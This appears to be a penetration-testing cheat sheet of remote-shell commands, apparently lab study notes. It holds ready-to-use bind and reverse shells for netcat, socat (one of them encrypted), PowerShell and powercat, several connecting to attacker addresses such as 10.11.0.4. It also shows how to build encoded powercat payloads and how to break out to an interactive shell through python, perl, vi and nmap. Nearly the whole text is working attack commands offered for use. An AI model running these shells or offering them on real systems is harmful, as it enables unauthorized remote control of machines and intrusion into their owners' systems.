---
  title: "Shells and connections"
---

# Netcat
#### Bind shell
Victim side
`nc -nlvp 4444 -e cmd.exe`

Attacker side
`nc -nv IP 4444`

#### Reverse shell
Attacker side
`nc -nlvp 4444`

Victim side
`nc -nv IP 4444 -e /bin/bash`

# Socat
#### Bind shell
Victim side
`sudo socat TCP4-LISTEN:443 STDOUT`

Attacker side
`socat -TCP4:<remote server's ip address>:443`

#### Encrypted bind shell
create certificate
`openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt`

combine the bind_shell key and the bind_shell.crt
`cat bind_shell.key bind_shell.crt > bind_shell.pem`

server side
`socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash`

client side
`socat -OPENSSL:10.11.0.4:443,verify=0`
#### reverse shell
Victim side
`socat -d -d TCP4-LISTEN:443 STDOUT`

Attacker side
`socat TCP4:10.11.0.22:443 EXEC:/bin/bash`

# Powershell

#### reverse shell
Attacker
`nc -lnvp 443`

Victim
`$powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`

#### bind shell
Attacker
`nc -nv IP 443`

Victim
`powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' +(pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"`

# Powercat
#### reverse shell
Attacker
`nc -lvp 443`

Victim
`powercat -c 10.11.0.4 -p 443 -e cmd.exe`

#### bind shell
# Attacker
`nc IP 443`

# Victim
`powercat -l -p 443 -e cmd.exe`

#### create stand-alone payloads
powercat -c 10.11.0.4 -p 443 -e cmd.exe -g > reverseshell.ps1

#### create encoded stand-alone payloads
powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge > encodedreverseshell.ps1

#### run the encoded payload
owershell.exe -E ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMQBfAFMAZQB0AHUAcAAK..........


# Spawning a TTY shell
source: [netsec](https://netsec.ws/?p=337)

if python is available
`python -c 'import pty; pty.spawn("/bin/sh")'`

`echo os.system('/bin/bash')`

`/bin/sh -i`

if perl is available
`perl —e 'exec "/bin/sh";'`

`perl: exec "/bin/sh";`

if ruby is available
`ruby: exec "/bin/sh"`

if lua is available
`lua: os.execute('/bin/sh')`

Within IRB
`exec "/bin/sh"`

Within VI
`:!bash`

Within VI
`:set shell=/bin/bash:shell`

Within nmap console
`!sh`
